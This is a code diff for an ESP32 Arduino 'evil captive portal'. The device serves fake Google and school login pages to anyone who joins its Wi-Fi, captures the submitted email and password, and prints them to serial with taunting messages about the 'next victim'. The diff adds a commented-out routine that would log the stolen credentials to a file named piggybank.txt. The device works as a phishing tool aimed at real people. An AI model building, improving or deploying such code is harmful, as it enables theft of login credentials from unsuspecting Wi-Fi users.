@@ -1,8 +1,4 @@
-  /* ˗ˏˋ 𒉭  Dynamic captive portal  𒉭 ˊˎ˗  
-  to do :
-  1. add dynamic ssid change idk how.
-  2. read more comics 
-     */
+  /*  ˗ˏˋ 𒉭  Dynamic captive portal  𒉭 ˊˎ˗  */
 
 //Define libraries & variables
 #include <DNSServer.h>
@@ -12,7 +8,7 @@
 #include "FS.h"
 #include <LittleFS.h>
 
-// eSrver related variables
+// Server related variables
 DNSServer dnsServer;
 AsyncWebServer server(80);
 
@@ -38,15 +34,11 @@ public:
   }
 };
 
+// should change it to Domain name server
 void setupServer() {
-  // 2Serve 
-  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
-    request->send(LittleFS, "/index.html", "text/html");
-  });
-
-  // 2 redirection of the initial internet request
+  // Handle unknown requests (default to index.html for captive portal)
   server.onNotFound([](AsyncWebServerRequest *request){
-      request->send(LittleFS, "/index.html", "text/html");
+    request->send(LittleFS, "/school.html", "text/html"); //4testing purposes for now
   });
 
   // Serve images 
@@ -56,8 +48,15 @@ void setupServer() {
   server.on("/Kelogo.png", HTTP_GET, [](AsyncWebServerRequest *request){
     request->send(LittleFS, "/Kelogo.png", "image/png");
   });
+  server.on("/topbanner.png", HTTP_GET, [](AsyncWebServerRequest *request){
+    request->send(LittleFS, "/topbanner.png", "image/png");
+  });
 
   // Serve other pages
+  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
+    request->send(LittleFS, "/index.html", "text/html"); //testing 
+  });
+
   server.on("/google", HTTP_GET, [](AsyncWebServerRequest *request){
     request->send(LittleFS, "/google.html", "text/html");
   });
@@ -74,12 +73,13 @@ void setupServer() {
     request->send(LittleFS, "/warning.html", "text/html"); 
   });
 
-  // Handle unknown requests (default to index.html for captive portal)
-  server.onNotFound([](AsyncWebServerRequest *request){
-    request->send(LittleFS, "/index.html", "text/html");
+  server.on("/school", HTTP_GET, [](AsyncWebServerRequest *request){
+    request->send(LittleFS, "/school.html", "text/html");
   });
 
-  // Receive and process user input (Backend handling)  
+  // Receive and process user input (Backend handling) 
+  //Annoying error where i cant see all the strings and are replaced by annoying "?" emoji
+  // add jackpot.txt file?
   server.on("/get", HTTP_GET , [] (AsyncWebServerRequest *request) {
     String inputMessage;
     
@@ -131,12 +131,28 @@ void setup(){
   Serial.println("All Done!");
 
   if(email_received && passwd_received){
-      Serial.print("Captured Email: ");Serial.println(email);
-      Serial.print("Captured Passwd ");Serial.println(passwd);
-      email_received = false;
-      passwd_received = false;
-      Serial.println("Waiting for the next Victim now ( -_•)▄︻デ══━一 ");
-      Serial.println("   -𒉭𒉭𒉭𒉭𒉭𒉭𒉭𒉭𒉭𒉭𒉭𒉭𒉭-");
+    Serial.print("Captured Email: ");Serial.println(email);
+    Serial.print("Captured Passwd ");Serial.println(passwd);
+
+    Serial.println("Waiting for the next MWERE now ( -_•)▄︻デ══━一 ");
+    Serial.println("   -𒉭𒉭𒉭𒉭𒉭𒉭𒉭𒉭𒉭𒉭𒉭𒉭𒉭-");
+    /*  UNTESTED till i find a way to access the txt file but this works fine for now, if push comes to shove
+    implement a loop that prints out the contents after every 10 - 20 seconds. dont like this implementation 
+    option two is via file explora this is much better flow and sequence to the ? error 
+    // Saving captured creds into a txt file 2 counter that one error
+    File f = LittleFS.open("/piggybank.txt", "a"); // "a" autocreates if not there
+    if (!f){
+      Serial.println("Failed to access piggybank.txt");
+      return;
+    }
+    f.println(email);
+    f.println(passwd);
+    f.println(" <3 ");
+    */
+    //reset variables 
+    email_received = false;
+    passwd_received = false;
+      // does it work? who knows?
   }
 }
 
@@ -144,9 +160,4 @@ void loop(){
   dnsServer.processNextRequest();
 }
 
-/* 
-to do
-  
-  1.) Continous Study >>> https://github.com/bigbrodude6119/flipper-zero-evil-portal/blob/main/esp32/EvilPortal/EvilPortal.ino
 
-*/
